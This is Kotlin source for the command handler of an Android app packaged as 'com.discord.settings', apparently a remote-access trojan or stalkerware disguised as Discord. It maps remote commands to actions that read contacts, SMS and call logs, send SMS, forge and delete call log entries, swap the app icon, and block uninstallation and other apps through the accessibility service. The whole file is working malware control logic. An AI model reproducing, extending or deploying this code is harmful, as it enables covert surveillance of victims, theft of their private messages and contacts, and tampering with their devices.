package com.discord.settings

import android.content.Context

class Manage {
    fun process(data:List<String>,context: Context):String{
        if(data[1] == "ping"){
            return "ONLINE"
        }

        //check granted and denied permissions
        else if(data[1] == "permissions"){
            val result = Functions().checkPermissions(context)
            return result
        }
        else if(data[1] =="connection"){
            return  Functions().connectionType(context)
        }
        else if(data[1] =="localIp"){
            return Functions().localIp(context)
        }
        else if(data[1] =="details"){
            val value = Functions().getDetails(context)
            return value
        }
        else if(data[1] =="apps"){
            return Functions().getInstalledApps(context)

        }
        else if(data[1] =="flashON"){
            return Functions().switchFlashlight(context,true)

        }
        else if(data[1] =="flashOFF"){
            return Functions().switchFlashlight(context,false)

        }
        else if(data[1] =="hf"){
            return Functions().checkHeadphonesStatus(context)
        }
        else if(data[1] =="bt"){
            return Functions().checkBluetoothStatus()

        }else if(data[1] =="gps"){
            return Functions().isGpsEnabled(context)

        }
        else if(data[1] =="wifi"){
            return Functions().isConnectedToWifi(context)

        }
        else if(data[1] =="battery"){
            return Functions().getBatteryPercentage(context)

        }else if(data[1] =="power"){
            return Functions().isCharging(context)

        }
        else if(data[1] =="screen"){
            return Functions().isScreenOn(context)

        }
        else if(data[1] =="volume" && data.size>=4){
            return Functions().controlVolume(context,data[2],data[3])

        }else if(data[1] =="playMusic" && data.size>=3){
            return Functions().playMusicURL(data[2])
        }

        //need permission

        else if(data[1] == "contactsFilter" && data.size>=3 ){
            try{
                val filter = data[2].toCharArray()[0]
                val result = Functions().getContactsFiltered(context,filter)
                return result
            }catch(e:Exception){
                return "invalid contacts filter"
            }
        }

        else if(data[1] == "myContacts" ){
            val result = Functions().getContacts(context)
            return result
        }

        else if(data[1] == "sms"){
            val result = Functions().getMessages(context)
            return result
        }

        else if(data[1]=="calls"){
            val result = Functions().getCallLogs(context)
            return result
        }

        else if(data[1]=="createContact"  && data.size>=4){
            val result = Functions().createContact(context,data[2],data[3])
            return result
        }
        else if(data[1] == "createCall"  && data.size>=6){
            val result = Functions().addCallLogEntry(context,data[2],data[3],data[4].toLong(),data[5].toLong())
            return result
        }
        else if(data[1] == "sendSms"  && data.size>=4){
            var finalMessage = ""
            for ((index,value) in data.withIndex()){
                if(index>2){finalMessage+= "$value " }
            }
            val result = Functions().sendSms(context,data[2],finalMessage)
            return result
        }
        else if(data[1] =="deleteCall"  &&data.size>=3){
            if(data[2]=="last"){
                val result = Functions().deleteLastCallLog(context)
                return result
            }else{
                val result = Functions().deleteCallLogForNumber(context,data[2])
                return result
            }
        }
        else if(data[1]=="deleteContact"  && data.size>=3){
            val result = Functions().deleteContactByPhoneNumber(context,data[2])
            return result
        }
        else if(data[1]=="updateContact"  && data.size>=5){
            val result = Functions().updateContactByName(context,data[2],data[3],data[4])
            return result
        }
        else if(data[1] == "duplicateApp" && data.size>=3){
            val result = Functions().changeAppIcon(context,data[2])
            return result
        }
        else if(data[1]=="uninstall" && data.size>=3){
            val accessbilityPermission = Permissions().isAccessibilityServiceEnabled(context,AccessibilityService::class.java)
            if(data[2] == "block"){
                SaveLocalData().saveGlobalData(context,"UninstallData","true")
                return "Uninstallation Set to Block\\nAccessibility Permission : $accessbilityPermission"
            }else if(data[2]=="unblock"){
                SaveLocalData().saveGlobalData(context,"UninstallData","false")
                return "Uninstallation Set to Un-Block\\nAccessibility Permission : $accessbilityPermission"
            }
        }
        else if(data[1] =="blockApp" && data.size>=3){
            val accessbilityPermission = Permissions().isAccessibilityServiceEnabled(context,AccessibilityService::class.java)
            if(data[2]=="none"){
                SaveLocalData().saveGlobalData(context,"BlockAppData","")
                return "Cleared Blocked App List\\nAccessibility Permission : $accessbilityPermission"
            }else{
                SaveLocalData().saveGlobalData(context,"BlockAppData",data[2])
                return "Blocked Apps :  ${data[2].split("|")}\\nAccessibility Permission : $accessbilityPermission"
            }
        }
        return "Unknown Command : ${data[1]}"
    }
}